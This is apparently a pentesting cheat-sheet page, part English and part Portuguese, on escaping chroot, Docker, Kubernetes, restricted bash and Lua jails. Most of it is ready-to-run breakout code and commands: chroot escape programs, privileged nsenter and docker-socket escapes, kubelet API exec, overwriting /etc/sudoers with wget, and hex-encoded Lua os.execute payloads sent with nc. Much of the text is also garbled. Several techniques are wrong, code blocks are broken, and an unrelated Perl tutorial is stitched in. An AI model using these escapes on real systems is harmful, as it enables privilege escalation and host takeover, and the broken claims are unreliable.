# Escaping from Jails

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        exit(1);
    }

    if (chroot(argv[1]) != 0) {
        perror("chroot");
        exit(1);
    }

    if (chdir("/") != 0) {
        perror("chdir");
        exit(1);
    }

    system("/bin/bash");
    return 0;
}
```

```bash
gcc break_chroot.c -o break_chroot
./break_chroot /new_chroot
```

#### Root + Mount

If you are **root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.

```bash
mkdir /tmp/new_root
mount --bind / /tmp/new_root
chroot /tmp/new_root
```

#### User + CWD

If you are **not root** inside a chroot you **can escape** creating a **new chroot** with a **new user**. This because **chroot doesn't affect** the **user**.

```bash
mkdir /tmp/new_chroot
cp /bin/bash /tmp/new_chroot
chroot /tmp/new_chroot /bin/bash
su new_user
```

#### User + Mount

If you are **not root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.

```bash
mkdir /tmp/new_root
mount --bind / /tmp/new_root
chroot /tmp/new_root
su new_user
```

### Docker Escapes

#### Docker Breakouts

From [wikipedia](https://en.wikipedia.org/wiki/Docker\_\(software\)#Security): Docker's default configuration relies on the host kernel for container isolation and security. By default, Docker containers share the host system's filesystem and network interface(s), but can be further restricted with the `--read-only` and `--net=none` flags. Linux capabilities and seccomp filters can be used to control the container's access to the host system.

{% hint style="success" %}
The **tool** [**Docker Escape**](https://github.com/KrustyHack/docker-escape) was created to automate the following escenarios and scape from `Docker`.
{% endhint %}

#### Docker Breakout via Build

If you can **build a Docker image** you can **escape** from it.

```dockerfile
FROM ubuntu:18.04
RUN apt-get update && apt-get install -y wget
RUN wget https://raw.githubusercontent.com/KrustyHack/docker-escape/master/docker_escape.c
RUN gcc docker_escape.c -o docker_escape
CMD ["bash"]
```

```bash
docker build -t escape .
docker run -it --privileged escape
./docker_escape
```

#### Docker Breakout via Run

If you can **run a Docker container** you can **escape** from it.

```bash
docker run -it --rm --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

#### Docker Breakout via Volume

If you can **mount a volume** you can **escape** from it.

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

#### Docker Breakout via Environment Variables

If you can **set environment variables** you can **escape** from it.

```bash
docker run -it --rm -e LD_PRELOAD=/tmp/lib.so alpine sh
```

#### Docker Breakout via Docker Socket

If you can **access the Docker socket** you can **escape** from it.

```bash
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock alpine docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh
```

### Kubernetes Escapes

#### Kubernetes Breakouts

From [wikipedia](https://en.wikipedia.org/wiki/Kubernetes#Security): Kubernetes provides various security features to protect the master node(s) and the nodes. The API server component provides authentication and authorization mechanisms, such as client certificates, bearer tokens, and Kubernetes Role-Based Access Control (RBAC). The kubelet component provides node-level authentication and authorization using x509 certificates and a small set of built-in roles.

{% hint style="success" %}
The **tool** [**Kubeletctl**](https://github.com/cyberark/kubeletctl) was created to automate the following escenarios and scape from `Kubernetes`.
{% endhint %}

#### Kubernetes Breakout via Pod

If you can **create a pod** you can **escape** from it.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: breakout
spec:
  containers:
  - name: breakout
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "mount --bind / /mnt; chroot /mnt sh"]
    securityContext:
      privileged: true
  restartPolicy: Never
```

```bash
kubectl apply -f breakout.yaml
kubectl exec -it breakout sh
```

#### Kubernetes Breakout via Service Account Token

If you can **access a service account token** you can **escape** from it.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/pods
```

#### Kubernetes Breakout via Kubelet API

If you can **access the kubelet API** you can **escape** from it.

```bash
curl -k https://kubelet:10250/run/default/breakout -XPOST -d 'cmd=sh&cmd=-c&cmd=mount%20--bind%20/%20/mnt;%20chroot%20/mnt%20sh'
```

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

<details>

<summary>Python</summary>

Python

</details>

\`\`\`python #!/usr/bin/python import os os.mkdir("chroot-dir") os.chroot("chroot-dir") for i in range(1000): os.chdir("..") os.chroot(".") os.system("/bin/bash") \`\`\`

<details>

<summary>Perl</summary>

O Perl é uma linguagem de programação interpretada, multiplataforma e de alto nível. É frequentemente usada para automação de tarefas, processamento de texto e desenvolvimento web. O Perl é uma linguagem poderosa e flexível, com muitos módulos disponíveis para facilitar o desenvolvimento de aplicativos.

Para executar um comando em Perl, você pode usar a função `system()`. Por exemplo, para executar o comando `ls -la`, você pode usar o seguinte código:

```perl
system("ls -la");
```

Para executar um comando com privilégios elevados, você pode usar a função `sudo`. Por exemplo, para executar o comando `whoami` com privilégios elevados, você pode usar o seguinte código:

```perl
system("sudo whoami");
```

O Perl também tem a capacidade de executar comandos em segundo plano usando a função `fork()`. Por exemplo, para executar o comando `ping` em segundo plano, você pode usar o seguinte código:

```perl
if (fork() == 0) {
    exec("ping 8.8.8.8");
}
```

Este código cria um novo processo filho usando a função `fork()`. O processo filho executa o comando `ping 8.8.8.8` usando a função `exec()`. O processo pai continua a executar o código restante.

O Perl também tem a capacidade de executar comandos em um shell interativo usando a função `open()`. Por exemplo, para abrir um shell interativo, você pode usar o seguinte código:

```perl
open(SHELL, "|/bin/bash");
```

Este código abre um shell interativo usando a função `open()`. O shell é executado no modo de pipe, permitindo que você envie comandos para o shell e receba a saída de volta. Você pode enviar comandos para o shell usando a função `print()`. Por exemplo, para executar o comando `ls -la` no shell interativo, você pode usar o seguinte código:

```perl
print SHELL "ls -la\n";
```

Este código envia o comando `ls -la` para o shell interativo usando a função `print()`. A saída do comando é enviada de volta para o script Perl e pode ser lida usando a função `readline()`. Por exemplo, para ler a saída do comando `ls -la`, você pode usar o seguinte código:

```perl
while (<SHELL>) {
    print $_;
}
```

Este código lê a saída do shell interativo linha por linha usando a função `readline()` e a imprime na tela usando a função `print()`.

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

</details>

#### Root + FD salvo

{% hint style="warning" %}
Este caso é semelhante ao anterior, mas neste caso o **atacante armazena um descritor de arquivo para o diretório atual** e, em seguida, **cria o chroot em uma nova pasta**. Finalmente, como ele tem **acesso** a esse **FD fora** do chroot, ele o acessa e **escapa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd);\
for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (Unix Domain Sockets)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD pode ser passado por Unix Domain Sockets, então:

* Crie um processo filho (fork)
* Crie UDS para que o pai e o filho possam se comunicar
* Execute chroot no processo filho em uma pasta diferente
* No processo pai, crie um FD de uma pasta que está fora do novo chroot do processo filho
* Passe para o processo filho esse FD usando o UDS
* O processo filho muda para o diretório desse FD e, como está fora do chroot, ele escapará da prisão

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Montando o dispositivo raiz (/) em um diretório dentro do chroot
* Executando chroot nesse diretório

Isso é possível no Linux

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Monte o procfs em um diretório dentro do chroot (se ainda não estiver)
* Procure um pid que tenha uma entrada de raiz/cwd diferente, como: /proc/1/root
* Chroot nessa entrada

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Crie um Fork (processo filho) e chroot em uma pasta diferente mais profunda no FS e CD nela
* Do processo pai, mova a pasta onde o processo filho está para uma pasta anterior ao chroot dos filhos
* Esse processo filho se encontrará fora do chroot

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* Há algum tempo, os usuários podiam depurar seus próprios processos a partir de um processo próprio ... mas isso não é mais possível por padrão
* De qualquer forma, se for possível, você pode ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](linux-capabilities.md#cap\_sys\_ptrace)).

</div>

## Bash Jails

### Enumeração

Obtenha informações sobre a prisão:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### Modificar PATH

Verifique se é possível modificar a variável de ambiente PATH.

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### Usando o vim

```bash
:set shell=/bin/sh
:shell
```

#### Criar script

Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo.

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### Obter bash a partir do SSH

Se você estiver acessando via ssh, pode usar este truque para executar um shell bash:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### Declaração

```bash
declare -n PATH; export PATH=/bin;bash -i
 
BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

Você pode sobrescrever, por exemplo, o arquivo sudoers.

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### Outros truques

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/)\
**Também pode ser interessante a página:**

### Jaulas Python

Truques sobre como escapar de jaulas Python na seguinte página:

### Jaulas Lua

Nesta página, você pode encontrar as funções globais às quais você tem acesso dentro do Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Avaliação com execução de comando:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Algumas dicas para **chamar funções de uma biblioteca sem usar pontos**:

* Use a função `declare` para criar uma referência para a biblioteca: `declare -a lib=(/lib/x86_64-linux-gnu/libc.so.6)`
* Chame a função desejada usando a sintaxe `${lib[nome_da_funcao]}`: `${lib[system]}('ls')`

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

## Enumerar funções de uma biblioteca:

Para enumerar as funções de uma biblioteca, podemos usar a ferramenta `nm`. O `nm` lista os símbolos (incluindo as funções) de um arquivo objeto ou de uma biblioteca compartilhada.

Para listar as funções de uma biblioteca, execute o seguinte comando:

```bash
nm -gC /path/to/library.so
```

Onde `/path/to/library.so` é o caminho para a biblioteca que você deseja listar as funções.

O parâmetro `-g` lista apenas os símbolos globais (ou seja, as funções que podem ser acessadas por outros arquivos) e o parâmetro `-C` desmangle os nomes das funções (ou seja, converte os nomes das funções de sua forma codificada para sua forma legível por humanos).

O resultado será uma lista de todas as funções na biblioteca, juntamente com seus endereços na memória.

```bash
for k,v in pairs(string) do print(k,v) end
```

Observe que toda vez que você executa o comando anterior em um **ambiente lua diferente, a ordem das funções muda**. Portanto, se você precisar executar uma função específica, pode realizar um ataque de força bruta carregando diferentes ambientes lua e chamando a primeira função da biblioteca "le":

```bash
#In this scenario you could BF the victim that is generating a new lua environment 
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Obter shell lua interativa**: Se você estiver dentro de uma shell lua limitada, poderá obter uma nova shell lua (e, esperançosamente, ilimitada) chamando:

```bash
debug.debug()
```

### Referências

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
